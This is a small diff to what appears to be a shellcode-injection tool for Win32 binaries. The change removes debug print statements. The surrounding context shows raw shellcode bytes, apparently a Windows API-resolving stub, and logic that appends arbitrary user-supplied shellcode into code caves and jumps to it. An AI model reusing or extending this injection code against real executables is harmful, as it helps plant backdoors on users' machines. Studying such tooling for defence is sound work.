@@ -188,7 +188,7 @@ class winI32_shellcode():
         This module allows for the user to provide a win32 raw/binary
         shellcode.  For use with the -U flag.  Make sure to use a process safe exit function.
         """
-        print "in user_supplied_shellcode"
+
         flItms['stager'] = True
 
         if flItms['supplied_shellcode'] is None:
@@ -199,7 +199,6 @@ class winI32_shellcode():
 
         breakupvar = eat_code_caves(flItms, 0, 1)
         
-        print "breakupvar", breakupvar
         self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                            "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                            "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
@@ -286,7 +285,6 @@ class winI32_shellcode():
         #Can inject any shellcode below.
 
         self.shellcode2 += self.supplied_shellcode
-        print "self.supplied_shellcode", self.supplied_shellcode
         self.shellcode1 += "\xe9"
         self.shellcode1 += struct.pack("<I", len(self.shellcode2))
         
